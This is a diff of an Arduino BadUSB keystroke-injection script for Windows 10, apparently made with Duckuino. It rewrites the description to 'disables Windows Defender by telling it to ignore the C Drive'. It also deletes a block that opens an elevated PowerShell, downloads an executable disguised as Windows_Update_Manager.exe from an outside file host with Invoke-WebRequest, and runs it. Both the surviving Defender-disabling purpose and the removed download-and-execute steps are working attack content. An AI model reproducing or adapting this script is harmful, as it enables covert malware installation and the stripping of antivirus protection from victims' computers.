@@ -1,7 +1,7 @@
 /**
  * AUTHOR: Eddie Devine
  * TARGET: Windows 10
- * DESCRIPTION: Installs ands runs Enderman's WindowsUpdate.exe.
+ * DESCRIPTION: Disables Windows Defender by telling it to ignore the C Drive.
  * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
  
  * Made with Duckuino, an open-source project.
@@ -25,8 +25,7 @@ void setup()
 
   // Wait 500ms
   delay(500);
-
-  // Disable Windows Defender:
+  
   delay(1000);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_ESC);
@@ -122,55 +121,6 @@ void setup()
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
-
-  // Download and Run Malware:
-  delay(3000);
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-
-  delay(500);
-  Keyboard.print(F("powershell"));
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-
-  delay(2000);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('y');
-  Keyboard.releaseAll();
-
-  delay(1000);
-  Keyboard.print(F("$url = \"https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe\""));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("$outpath = \"C:\\Windows_Update_Manager.exe\""));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $outpath"));
-
-  typeKey(KEY_RETURN);
-
-  delay(1000);
-  Keyboard.print(F("cd .."));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("cd.."));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("start Windows_Update_Manager.exe"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("exit"));
-
-  typeKey(KEY_RETURN);
 
   // Ending stream
   Keyboard.end();
